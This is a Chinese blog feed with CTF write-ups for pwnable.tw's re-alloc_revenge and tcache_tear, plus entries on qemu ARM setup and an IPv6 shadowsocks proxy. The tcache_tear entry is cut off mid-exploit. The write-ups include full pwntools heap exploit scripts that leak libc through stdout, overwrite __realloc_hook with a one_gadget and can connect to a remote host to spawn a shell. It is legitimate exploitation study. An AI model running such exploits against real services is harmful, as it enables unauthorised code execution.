&lt;p&gt;动态链接库被安装在类似&lt;code&gt;/usr/arm-linux-gnueabihf/&lt;/code&gt;的路径。qemu不知道动态链接的位置，它预期在类似&lt;code&gt;/etc/qemu-binfmt/arm&lt;/code&gt;的路径，所以可以设置软链接来避免用&lt;code&gt;-L&lt;/code&gt;来指定链接库位置。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo mkdir /etc/qemu-binfmt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 &lt;span class=&quot;comment&quot;&gt;# 对于aarch64&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="ARM" scheme="http://hhdx.xyz/tags/ARM/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw re-alloc_revenge</title>
    <link href="http://hhdx.xyz/2020/09/07/pwnable-tw-re-alloc-revenge/"/>
    <id>http://hhdx.xyz/2020/09/07/pwnable-tw-re-alloc-revenge/</id>
    <published>2020-09-07T06:48:20.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>防护比<a href="https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/">re-alloc</a>多了FULL RELRO和PIE。其他没有改变。</p><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>程序没有show函数，所以通过修改stdout的方式泄露libc。</p><p>将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。</p><p>最后修改<code>__realloc_hook</code>为one_gadget得到shell。</p><p>主要难点在布局构造。</p><a id="more"></a><h2 id="partial-overwrite指向stdout"><a href="#partial-overwrite指向stdout" class="headerlink" title="partial overwrite指向stdout"></a>partial overwrite指向stdout</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将chunk(0x70)分割成0x20和0x50的两块，造成overlap</span></span><br><span class="line"><span class="comment"># 便于后续修改chunk(0x50)的size</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free chunk(0x50)</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改chunk(0x50)的size</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;C&quot;</span>)</span><br><span class="line">allocate(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x451</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass prev_inuse(nextchunk) check in free function</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># free to unsorted bin</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># partial overwrite to stdout</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">b&quot;\x60\xa7&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>本地写exploit的时候，可以在process中指定参数<code>aslr=False</code>，禁用随机化，避免爆破，便于调试。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc_revenge/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./re-alloc_revenge&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    one_gadget = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;C&quot;</span>)</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x451</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0x60 count++</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">b&quot;\x60\xa7&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;&quot;&quot;b menu</span></span><br><span class="line">    <span class="comment"># b read_input</span></span><br><span class="line">    <span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">&quot;E&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;E&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;E&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b menu&quot;)</span></span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&quot;leak:&quot;</span>.rjust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(io.recvuntil(<span class="string">&quot;leak:&quot;</span>, timeout=<span class="number">1</span>)) == <span class="number">0</span>:</span><br><span class="line">        log.debug(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x1E5700</span></span><br><span class="line">    pf(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b menu&quot;)</span></span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">&quot;F&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;F&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b menu&quot;)</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">b&quot;F&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x61</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__realloc_hook&quot;</span>]))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;G&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&quot;G&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b realloc&quot;)</span></span><br><span class="line">    <span class="comment"># allocate(1, 0x58, p64(libc_base+libc.sym[&quot;malloc&quot;])+p64(libc_base+one_gadget))</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, p64(libc_base+one_gadget))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># if True:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&quot;----------------------------------------------------------&quot;</span>)</span><br><span class="line">        argc = len(sys.argv)</span><br><span class="line">        <span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># io = process(localfile, aslr=False)</span></span><br><span class="line">            io = process(localfile)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">                host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">                host = sys.argv[<span class="number">1</span>]</span><br><span class="line">                port = sys.argv[<span class="number">2</span>]</span><br><span class="line">            io = remote(host, port)</span><br><span class="line"></span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><p><a href="https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0">https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0</a></p></li><li><p><a href="http://blog.eonew.cn/archives/1190">http://blog.eonew.cn/archives/1190</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;防护比&lt;a href=&quot;https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/&quot;&gt;re-alloc&lt;/a&gt;多了FULL RELRO和PIE。其他没有改变。&lt;/p&gt;
&lt;h2 id=&quot;总体思路&quot;&gt;&lt;a href=&quot;#总体思路&quot; class=&quot;headerlink&quot; title=&quot;总体思路&quot;&gt;&lt;/a&gt;总体思路&lt;/h2&gt;&lt;p&gt;程序没有show函数，所以通过修改stdout的方式泄露libc。&lt;/p&gt;
&lt;p&gt;将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。&lt;/p&gt;
&lt;p&gt;最后修改&lt;code&gt;__realloc_hook&lt;/code&gt;为one_gadget得到shell。&lt;/p&gt;
&lt;p&gt;主要难点在布局构造。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>R7000梅林搭建ipv6代理</title>
    <link href="http://hhdx.xyz/2020/09/01/R7000%E6%A2%85%E6%9E%97%E6%90%AD%E5%BB%BAipv6%E4%BB%A3%E7%90%86/"/>
    <id>http://hhdx.xyz/2020/09/01/R7000%E6%A2%85%E6%9E%97%E6%90%AD%E5%BB%BAipv6%E4%BB%A3%E7%90%86/</id>
    <published>2020-09-01T00:55:50.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<p>目前宽带基本都支持了ipv6(可能需要自己在光猫开启)，为了在学校省流量，利用家庭宽带的ipv6环境搭一个代理。</p><p>R7000固件版本是koolshare X7.9.1，使用软件中心ss server 3.1。默认情况下，该插件不支持ipv6代理。通过查看该<a href="https://github.com/koolshare/merlin-ssserver">插件的代码</a>，发现了可以修改启动脚本使其支持ipv6。</p><p>需要开启固件的telnet或者ssh。</p><p>/koolshare/ssserver/目录下存放的其启动脚本ssserver.sh。</p><p>修改服务器地址为<code>::</code>，并添加允许外部访问的两条规则。重新启动插件就可以了。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-01%20091624.jpg"></p><p>客户端windows可以使用<a href="https://github.com/shadowsocks/shadowsocks-windows">shadowsocks-windows</a>，mac可以用<a href="https://github.com/shadowsocks/ShadowsocksX-NG">ShadowsocksX-NG</a></p><p>实测延迟183，受限于家庭宽带上传，30Mbps下载，5Mbps上传…..</p><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><a href="https://www.polarxiong.com/archives/%E6%90%AD%E5%BB%BAipv6-VPN-%E8%AE%A9ipv4%E4%B8%8Aipv6-%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E6%8F%90%E5%8D%87%E5%88%B0100M.html">https://www.polarxiong.com/archives/%E6%90%AD%E5%BB%BAipv6-VPN-%E8%AE%A9ipv4%E4%B8%8Aipv6-%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E6%8F%90%E5%8D%87%E5%88%B0100M.html</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目前宽带基本都支持了ipv6(可能需要自己在光猫开启)，为了在学校省流量，利用家庭宽带的ipv6环境搭一个代理。&lt;/p&gt;
&lt;p&gt;R7000固件版本是koolshare X7.9.1，使用软件中心ss server 3.1。默认情况下，该插件不支持ipv6代理。通过查看该&lt;a</summary>
      
    
    
    
    
    <category term="misc" scheme="http://hhdx.xyz/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw tcache_tear seethefile</title>
    <link href="http://hhdx.xyz/2020/08/19/pwnable-tw-tcache-tear-seethefile/"/>
    <id>http://hhdx.xyz/2020/08/19/pwnable-tw-tcache-tear-seethefile/</id>
    <published>2020-08-19T09:26:17.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tcache-tear"><a href="#tcache-tear" class="headerlink" title="tcache_tear"></a>tcache_tear</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br><span class="line"></span><br><span class="line">libc_version: Ubuntu GLIBC 2.27-3ubuntu1</span><br></pre></td></tr></table></figure><p>程序开始在bss段上读入了一个0x20的名字</p><p>malloc: 输入指定size，分配，指针ptr同样存储在bss，读入size-16的字符，这里字符个数可以溢出</p><p>free: 释放ptr空间，指针悬空，可以double free，程序使用了tcache，且在这个版本释放没有任何的检查</p><p>info: 打印姓名</p><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>利用tcache double free，可以对任意地址进行改写。在name处伪造一个chunk释放到unsorted bin，进行libc base的泄露。将<code>__free_hook</code>改写为system地址。</p><p>伪造chunk注意绕过free的所有检查。伪造完成的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">|          |</span><br><span class="line">|          |</span><br><span class="line">|  0x421   |</span><br><span class="line">|          |</span><br><span class="line">+----------+</span><br><span class="line">|  0x21    |</span><br><span class="line">+----------+</span><br><span class="line">|  0x21    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p>tcache默认最多有64个，第1个是0x20大小，递推第64个也就是0x410。所以将name处伪造为0x420大小。第一个chunk的<code>chunk-&gt;size=0x420|pre_in_use</code>，避免backward consolidate，第三个chunk的<code>chunk-&gt;size=0x20|pre_in_use</code>，避免forward consolidate。</p><a id="more"></a><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/tcache_tear/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;info&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./tcache_tear&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    